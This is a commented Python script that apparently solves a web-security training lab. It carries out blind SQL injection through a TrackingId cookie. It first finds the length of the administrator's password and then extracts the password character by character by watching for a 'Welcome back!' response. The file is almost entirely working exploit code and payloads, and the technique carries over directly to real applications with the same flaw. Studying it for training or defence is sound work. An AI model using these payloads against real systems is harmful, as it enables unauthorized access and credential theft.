#MYSQL DB
from pwn import * 
import requests,signal,time,pdb,sys,string

def def_handler(sig,frame): # Just a basic def_handler
    print("\n\n[!] Stopping Process...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

url="https://0a82001904075c7b85385fbb00da008e.web-security-academy.net/filter?category=Pets"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    # Create a progress logger to visualize the attack progress
    # (Purely cosmetic – makes the script output cleaner and easier to follow)
    p1 = log.progress("Starting Blind SQL Injection")
    
    password = ""  # This will store the extracted administrator password
    
    # -----------------------------
    # STEP 1 – Determine password length
    # -----------------------------
    # We iterate through a reasonable range (0–30) to guess the password length.
    # The injected payload checks whether LENGTH(password) >= current number.
    
    for number in range(0,30):
        cookies1 = {
            # Injecting into the TrackingId cookie
            # The payload checks:
            # Is the administrator password length >= number?
            #
            # If TRUE  → the SQL condition is valid → "Welcome back!" appears
            # If FALSE → the condition fails → no "Welcome back!" message
            #
            # Once the condition fails, we know we passed the real length.
            'TrackingId': "cXpjfSas1knJFT2g' AND (select 'a' from users where username='administrator' and LENGTH(password)>=%i)='a" % (number),
            
            # Valid session cookie required by the lab
            'session': "rQDw2wPN1iJrXL9CFz2WCCqyOCDHc5Yo"
        }
        
        # Send HTTP request with the malicious cookie
        http = requests.get(url, cookies=cookies1)
        
        # Show current payload in progress bar
        p1.status(cookies1['TrackingId'])
        
        # If we DON'T see "Welcome back!" anymore,
        # it means the condition LENGTH(password) >= number is FALSE.
        # Therefore, the password length must be number - 1.
        if "Welcome back!" not in http.text:
            pass_lenght = number - 1
            break
            
    print("Password length: %i" % (pass_lenght))
    
    # -----------------------------
    # STEP 2 – Extract password character by character
    # -----------------------------
    p2 = log.progress("Password")
    
    # Loop through each character position of the password
    # Positions start at 1 (SQL SUBSTRING is 1-based indexing)
    for position in range(1, number):
        
        # Try each possible character from a predefined charset
        for character in characters:
            
            cookies2 = {
                # This payload checks:
                # Does the character at position X equal 'character'?
                #
                # If TRUE  → "Welcome back!" appears
                # If FALSE → normal response
                #
                # '--' comments out the rest of the SQL query
                'TrackingId': "cXpjfSas1knJFT2g' AND (select SUBSTRING(password, %i,1) from users where username='administrator')='%s'--" % (position, character),
                
                'session': "rQDw2wPN1iJrXL9CFz2WCCqyOCDHc5Yo"
            }
            
            # Send request with the injected condition
            r = requests.get(url, cookies=cookies2)
            
            # Update progress displays
            p1.status(cookies2['TrackingId'])
            p2.status(password)
            
            # If the application responds with "Welcome back!"
            # our guess for this character is correct.
            if "Welcome back!" in r.text:
                password += character  # Append correct character
                break  # Move to next position
    
    print("The password is: %s" % password)


# Entry point of the script
if __name__ == "__main__":
    makeRequest()
